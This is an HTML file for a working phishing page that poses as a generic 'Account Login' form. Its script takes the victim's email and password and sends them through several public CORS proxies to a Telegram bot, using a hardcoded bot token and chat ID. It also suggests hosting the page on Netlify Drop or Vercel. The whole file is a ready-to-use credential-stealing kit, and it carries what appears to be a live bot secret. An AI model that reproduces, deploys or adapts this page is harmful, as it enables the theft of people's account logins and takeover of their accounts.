<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Login</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea, #764ba2); margin:0; padding:0; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .container { background:white; padding:40px 30px; border-radius:12px; box-shadow:0 10px 25px rgba(0,0,0,0.2); width:360px; text-align:center; }
        input { width:100%; padding:14px; margin:12px 0; border:1px solid #ddd; border-radius:6px; font-size:16px; }
        button { width:100%; padding:14px; background:#28a745; color:white; border:none; border-radius:6px; font-size:17px; cursor:pointer; }
        .message { margin-top:15px; font-size:15px; padding:10px; border-radius:6px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Account Login</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div id="status" class="message"></div>
    </div>

    <script>
        const BOT_TOKEN = "8653255945:AAFOGKnaoEG-ltAoKtkp_Nvs3aZFGcxiR4M";
        const CHAT_ID = "899546564";

        const form = document.getElementById('loginForm');
        const status = document.getElementById('status');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!email || !password) {
                status.innerHTML = "⚠️ Please fill both fields";
                status.style.color = "red";
                return;
            }

            status.innerHTML = "Sending to Telegram...";
            status.style.color = "blue";

            const messageText = `🔐 New Login\n\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;

            // Try multiple proxies
            const proxies = [
                "https://api.allorigins.win/get?url=",
                "https://corsproxy.io/?",
                "https://proxy.cors.sh/"
            ];

            let success = false;

            for (let proxy of proxies) {
                try {
                    let url = proxy === "https://proxy.cors.sh/" 
                        ? proxy + "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage" 
                        : proxy + encodeURIComponent("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(messageText));

                    const response = await fetch(url, {
                        method: proxy === "https://proxy.cors.sh/" ? 'POST' : 'GET',
                        headers: proxy === "https://proxy.cors.sh/" ? {
                            'Content-Type': 'application/json',
                            'x-cors-api-key': 'temp'
                        } : {}
                    });

                    if (response.ok) {
                        success = true;
                        break;
                    }
                } catch (e) {}
            }

            if (success) {
                status.innerHTML = "✅ Sent to Telegram!";
                status.style.color = "green";
            } else {
                status.innerHTML = "❌ Still network error.<br>Try Netlify Drop or Vercel.";
                status.style.color = "red";
            }
        });
    </script>
</body>
</html>
